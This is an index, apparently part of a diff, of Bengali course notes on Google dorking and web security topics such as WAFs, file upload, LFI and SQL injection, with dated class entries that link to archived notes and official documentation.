+- [অফিসিয়াল রেফারেন্স ↗](https://developers.google.com/search/docs/monitor-debug/search-operators)
+
+### notes-class07-google-dorks — ক্লাস 07 — পাঠনোট ও Google Advanced Search / Dork
+
+বিষয়: WAF · তারিখ: 2026-08-14 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class07-google-dorks)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class07-search-study-guide.md)
+- [অফিসিয়াল রেফারেন্স ↗](https://owasp.org/www-community/Web_Application_Firewall)
+- [অফিসিয়াল রেফারেন্স ↗](https://support.google.com/websearch/answer/2466433?hl=en)
+- [অফিসিয়াল রেফারেন্স ↗](https://developers.google.com/search/docs/monitor-debug/search-operators)
+
+### notes-class08-google-dorks — ক্লাস 08 — পাঠনোট ও Google Advanced Search / Dork
+
+বিষয়: Burp Suite · তারিখ: 2026-08-16 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class08-google-dorks)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class08-search-study-guide.md)
+- [অফিসিয়াল রেফারেন্স ↗](https://portswigger.net/burp/documentation)
+- [অফিসিয়াল রেফারেন্স ↗](https://support.google.com/websearch/answer/2466433?hl=en)
+- [অফিসিয়াল রেফারেন্স ↗](https://developers.google.com/search/docs/monitor-debug/search-operators)
+
+### notes-class09-google-dorks — ক্লাস 09 — পাঠনোট ও Google Advanced Search / Dork
+
+বিষয়: WebShell · তারিখ: 2026-08-21 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class09-google-dorks)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class09-search-study-guide.md)
+- [অফিসিয়াল রেফারেন্স ↗](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
+- [অফিসিয়াল রেফারেন্স ↗](https://support.google.com/websearch/answer/2466433?hl=en)
+- [অফিসিয়াল রেফারেন্স ↗](https://developers.google.com/search/docs/monitor-debug/search-operators)
+
+### notes-class10-google-dorks — ক্লাস 10 — পাঠনোট ও Google Advanced Search / Dork
+
+বিষয়: File Upload · তারিখ: 2026-08-23 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class10-google-dorks)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class10-search-study-guide.md)
+- [অফিসিয়াল রেফারেন্স ↗](https://portswigger.net/web-security/file-upload)
+- [অফিসিয়াল রেফারেন্স ↗](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
+- [অফিসিয়াল রেফারেন্স ↗](https://support.google.com/websearch/answer/2466433?hl=en)
+- [অফিসিয়াল রেফারেন্স ↗](https://developers.google.com/search/docs/monitor-debug/search-operators)
+
+### notes-class11-google-dorks — ক্লাস 11 — পাঠনোট ও Google Advanced Search / Dork
+
+বিষয়: PortSwigger Labs · তারিখ: 2026-08-28 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class11-google-dorks)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class11-search-study-guide.md)
+- [অফিসিয়াল রেফারেন্স ↗](https://portswigger.net/web-security)
+- [অফিসিয়াল রেফারেন্স ↗](https://support.google.com/websearch/answer/2466433?hl=en)
+- [অফিসিয়াল রেফারেন্স ↗](https://developers.google.com/search/docs/monitor-debug/search-operators)
+
+### notes-class12-google-dorks — ক্লাস 12 — পাঠনোট ও Google Advanced Search / Dork
+
+বিষয়: Acunetix · তারিখ: 2026-08-30 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class12-google-dorks)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class12-search-study-guide.md)
+- [অফিসিয়াল রেফারেন্স ↗](https://www.acunetix.com/support/docs/)
+- [অফিসিয়াল রেফারেন্স ↗](https://support.google.com/websearch/answer/2466433?hl=en)
+- [অফিসিয়াল রেফারেন্স ↗](https://developers.google.com/search/docs/monitor-debug/search-operators)
+
+### notes-class13-google-dorks — ক্লাস 13 — পাঠনোট ও Google Advanced Search / Dork
+
+বিষয়: Linux & Scripting · তারিখ: 2026-09-04 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class13-google-dorks)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class13-search-study-guide.md)
+- [অফিসিয়াল রেফারেন্স ↗](https://learn.microsoft.com/windows-server/administration/windows-commands/windows-commands)
+- [অফিসিয়াল রেফারেন্স ↗](https://support.google.com/websearch/answer/2466433?hl=en)
+- [অফিসিয়াল রেফারেন্স ↗](https://developers.google.com/search/docs/monitor-debug/search-operators)
+
+### notes-class14-google-dorks — ক্লাস 14 — পাঠনোট ও Google Advanced Search / Dork
+
+বিষয়: Linux & Scripting · তারিখ: 2026-09-06 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class14-google-dorks)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class14-search-study-guide.md)
+- [অফিসিয়াল রেফারেন্স ↗](https://www.kali.org/docs/installation/)
+- [অফিসিয়াল রেফারেন্স ↗](https://support.google.com/websearch/answer/2466433?hl=en)
+- [অফিসিয়াল রেফারেন্স ↗](https://developers.google.com/search/docs/monitor-debug/search-operators)
+
+### notes-class15-google-dorks — ক্লাস 15 — পাঠনোট ও Google Advanced Search / Dork
+
+বিষয়: Linux & Scripting · তারিখ: 2026-09-11 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class15-google-dorks)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class15-search-study-guide.md)
+- [অফিসিয়াল রেফারেন্স ↗](https://www.gnu.org/software/bash/manual/)
+- [অফিসিয়াল রেফারেন্স ↗](https://support.google.com/websearch/answer/2466433?hl=en)
+- [অফিসিয়াল রেফারেন্স ↗](https://developers.google.com/search/docs/monitor-debug/search-operators)
+
+### notes-class16-google-dorks — ক্লাস 16 — পাঠনোট ও Google Advanced Search / Dork
+
+বিষয়: Malware Concepts · তারিখ: 2026-09-13 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class16-google-dorks)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class16-search-study-guide.md)
+- [অফিসিয়াল রেফারেন্স ↗](https://learn.microsoft.com/defender-endpoint/)
+- [অফিসিয়াল রেফারেন্স ↗](https://support.google.com/websearch/answer/2466433?hl=en)
+- [অফিসিয়াল রেফারেন্স ↗](https://developers.google.com/search/docs/monitor-debug/search-operators)
+
+### notes-class17-google-dorks — ক্লাস 17 — পাঠনোট ও Google Advanced Search / Dork
+
+বিষয়: LFI & Server Security · তারিখ: 2026-09-18 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class17-google-dorks)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class17-search-study-guide.md)
+- [অফিসিয়াল রেফারেন্স ↗](https://portswigger.net/web-security/file-path-traversal)
+- [অফিসিয়াল রেফারেন্স ↗](https://support.google.com/websearch/answer/2466433?hl=en)
+- [অফিসিয়াল রেফারেন্স ↗](https://developers.google.com/search/docs/monitor-debug/search-operators)
+
+### notes-class18-google-dorks — ক্লাস 18 — পাঠনোট ও Google Advanced Search / Dork
+
+বিষয়: Linux & Scripting · তারিখ: 2026-09-20 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class18-google-dorks)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class18-search-study-guide.md)
+- [অফিসিয়াল রেফারেন্স ↗](https://go.dev/doc/install)
+- [অফিসিয়াল রেফারেন্স ↗](https://portswigger.net/burp/documentation)
+- [অফিসিয়াল রেফারেন্স ↗](https://support.google.com/websearch/answer/2466433?hl=en)
+- [অফিসিয়াল রেফারেন্স ↗](https://developers.google.com/search/docs/monitor-debug/search-operators)
+
+### notes-class19-google-dorks — ক্লাস 19 — পাঠনোট ও Google Advanced Search / Dork
+
+বিষয়: LFI & Server Security · তারিখ: 2026-09-25 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class19-google-dorks)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class19-search-study-guide.md)
+- [অফিসিয়াল রেফারেন্স ↗](https://portswigger.net/web-security/file-path-traversal)
+- [অফিসিয়াল রেফারেন্স ↗](https://support.google.com/websearch/answer/2466433?hl=en)
+- [অফিসিয়াল রেফারেন্স ↗](https://developers.google.com/search/docs/monitor-debug/search-operators)
+
+### notes-class20-google-dorks — ক্লাস 20 — পাঠনোট ও Google Advanced Search / Dork
+
+বিষয়: WordPress · তারিখ: 2026-09-27 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class20-google-dorks)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class20-search-study-guide.md)
+- [অফিসিয়াল রেফারেন্স ↗](https://developer.wordpress.org/advanced-administration/security/hardening/)
+- [অফিসিয়াল রেফারেন্স ↗](https://support.google.com/websearch/answer/2466433?hl=en)
+- [অফিসিয়াল রেফারেন্স ↗](https://developers.google.com/search/docs/monitor-debug/search-operators)
+
+### notes-class21-google-dorks — ক্লাস 21 — পাঠনোট ও Google Advanced Search / Dork
+
+বিষয়: Recon · তারিখ: 2026-10-02 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class21-google-dorks)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class21-search-study-guide.md)
+- [অফিসিয়াল রেফারেন্স ↗](https://docs.shodan.io/)
+- [অফিসিয়াল রেফারেন্স ↗](https://support.google.com/websearch/answer/2466433?hl=en)
+- [অফিসিয়াল রেফারেন্স ↗](https://developers.google.com/search/docs/monitor-debug/search-operators)
+
+### notes-class22-google-dorks — ক্লাস 22 — পাঠনোট ও Google Advanced Search / Dork
+
+বিষয়: WordPress · তারিখ: 2026-10-04 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class22-google-dorks)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class22-search-study-guide.md)
+- [অফিসিয়াল রেফারেন্স ↗](https://www.wordfence.com/help/)
+- [অফিসিয়াল রেফারেন্স ↗](https://duplicator.com/knowledge-base/)
+- [অফিসিয়াল রেফারেন্স ↗](https://www.apachefriends.org/)
+- [অফিসিয়াল রেফারেন্স ↗](https://support.google.com/websearch/answer/2466433?hl=en)
+- [অফিসিয়াল রেফারেন্স ↗](https://developers.google.com/search/docs/monitor-debug/search-operators)
+
+### notes-class23-google-dorks — ক্লাস 23 — পাঠনোট ও Google Advanced Search / Dork
+
+বিষয়: Recon · তারিখ: 2026-10-09 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class23-google-dorks)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class23-search-study-guide.md)
+- [অফিসিয়াল রেফারেন্স ↗](https://developers.google.com/search/docs/monitor-debug/search-operators)
+- [অফিসিয়াল রেফারেন্স ↗](https://support.google.com/websearch/answer/2466433?hl=en)
+
+### notes-class24-google-dorks — ক্লাস 24 — পাঠনোট ও Google Advanced Search / Dork
+
+বিষয়: SQL Injection · তারিখ: 2026-10-11 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class24-google-dorks)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class24-search-study-guide.md)
+- [অফিসিয়াল রেফারেন্স ↗](https://github.com/sqlmapproject/sqlmap)
+- [অফিসিয়াল রেফারেন্স ↗](https://github.com/hahwul/dalfox)
+- [অফিসিয়াল রেফারেন্স ↗](https://support.google.com/websearch/answer/2466433?hl=en)
+- [অফিসিয়াল রেফারেন্স ↗](https://developers.google.com/search/docs/monitor-debug/search-operators)
+
+## অফিসিয়াল সিলেবাস
+
+[মূল সংরক্ষিত syllabus PDF](https://arena-b66-delta-archive.vercel.app/documents/arena-course-syllabus-v7.pdf)
+
+## সংরক্ষণের সীমা
+
+মূলে/বাহ্যিক হোস্টে থাকা লিংক নিজের স্বাধীন backup-এর সমান নয়। টুলসের card থাকলে সরাসরি installer আছে—এমন দাবি নয়। প্রথম চার ক্লাসের screen-date এবং সকল ভিডিওর পূর্ণ বিশ্লেষণের বাকি অবস্থা সাইটে দেখানো আছে।
